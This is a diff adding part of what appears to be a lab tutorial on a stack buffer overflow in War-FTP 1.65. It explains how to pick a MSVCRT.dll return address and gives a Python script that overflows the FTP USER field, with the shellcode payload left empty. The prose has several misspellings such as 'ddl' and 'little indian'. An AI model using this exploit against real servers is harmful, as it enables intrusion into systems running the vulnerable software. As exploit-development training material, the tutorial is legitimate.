@@ -329,3 +329,44 @@ The results should be simlar to the following:
 
 
 When Looking through the addresses for overwriting ( you will wanna look for the exe file of the vulnerable application )
+
+If you cannot find the exe of the vulnerable application then you should look for a common "*.ddl" library like MSVCRT.dll 
+
+You can also take a look at jmp.txt for the remainder of the vulnerable applications 
+
+MSVRCT.ddl return address is: \x59\x54\xc3\x77 ( because of little indian we want to reverse it that is why it is reversed )
+
+so we updated our exploit to look like this:
+
+```python3
+#!/usr/bin/python3
+
+## War-FTP 1.65 Exploit
+
+import socket
+from urllib import response 
+
+# define the variables to be sent to the server
+ip = '192.168.164.170'
+port = 21
+retn = b"\x59\x54\xc3\x77"
+payload = ""
+buffer = b"A" * 485 + retn + b"C" * (1100 - 485 - 4)
+
+# create the socket to connect to the server
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((ip, port))
+# because there is a banner we wanna print it out 
+response = s.recv(1024)
+print(response)
+
+# sending the exploit 
+s.send(b"USER " + buffer + b"\r\n")
+response = s.recv(1024)
+print(response)
+
+# because you have to enter the pass as well 
+s.send(b"PASS parrot\r\n")
+s.close()
+```
+
